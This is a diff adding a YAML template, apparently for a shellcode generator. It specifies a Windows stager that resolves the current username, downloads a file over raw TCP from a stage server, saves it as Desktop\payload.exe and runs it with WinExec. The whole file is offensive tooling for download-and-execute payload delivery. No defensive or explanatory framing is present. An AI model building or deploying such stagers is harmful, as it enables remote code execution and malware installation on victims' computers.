@@ -1,0 +1,42 @@
+# TCP download a file and save to a user-specific path, then execute.
+# Resolves username at runtime with GetUserNameA.
+# Uses raw TCP (same protocol as tcp_stage_server.py).
+template: tcp_download_to_userpath
+badchars: []
+
+functions:
+  - LoadLibraryA
+  - GetUserNameA
+  - WSAStartup
+  - WSASocketA
+  - connect
+  - recv
+  - closesocket
+  - VirtualAlloc
+  - CreateFileA
+  - WriteFile
+  - CloseHandle
+  - WinExec
+
+variables:
+  - username_len
+  - path_buf_ptr
+  - socket_handle
+  - file_handle
+  - virt_buf
+  - bytes_total
+  - bytes_recvd
+
+strings:
+  - label: advapi_dll
+    value: advapi32.dll
+    method: push
+  - label: ws2_dll
+    value: ws2_32.dll
+    method: push
+  - label: path_prefix
+    value: "C:\\Users\\"
+    method: push
+  - label: path_suffix
+    value: "\\Desktop\\payload.exe"
+    method: push
